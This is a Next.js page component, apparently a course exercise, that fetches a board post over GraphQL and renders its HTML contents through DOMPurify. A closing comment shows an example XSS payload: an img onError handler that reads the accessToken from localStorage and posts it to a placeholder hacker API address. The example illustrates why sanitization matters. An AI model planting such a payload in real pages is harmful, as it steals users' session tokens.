import { gql, useQuery } from "@apollo/client";
import { useRouter } from "next/router";
import Dompurify from "dompurify";

const FETCH_BOARD = gql`
  query fetchBoard($boardId: ID!) {
    fetchBoard(boardId: $boardId) {
      _id
      writer
      title
      contents
    }
  }
`;

export default function StaticRoutedPage() {
  const router = useRouter();

  const { data } = useQuery(FETCH_BOARD, {
    variables: {
      boardId: String(router.query._id),
    },
  });

  return (
    <>
      <div style={{ color: "red" }}>
        작성자: {data ? data.fetchBoard.writer : "로딩중입니다..."}
      </div>
      <div style={{ color: "green" }}>
        제목: {data && data.fetchBoard.title}
      </div>
      {typeof window !== "undefined" ? (
        <div
          style={{ color: "blue" }}
          dangerouslySetInnerHTML={{
            __html: Dompurify.sanitize(data?.fetchBoard.contents),
          }}
        ></div>
      ) : (
        <div style={{ color: "blue" }}></div>
      )}
      <div style={{ color: "pink" }}>주소: 서울시 구로구</div>
    </>
  );
}

// playground XSS 공격
// <img src="#" onError="
// 	const aaa = localStorage.getItem('accessToken');
// 	axios.post(해커API주소, {accessToken = aaa});
// "/>
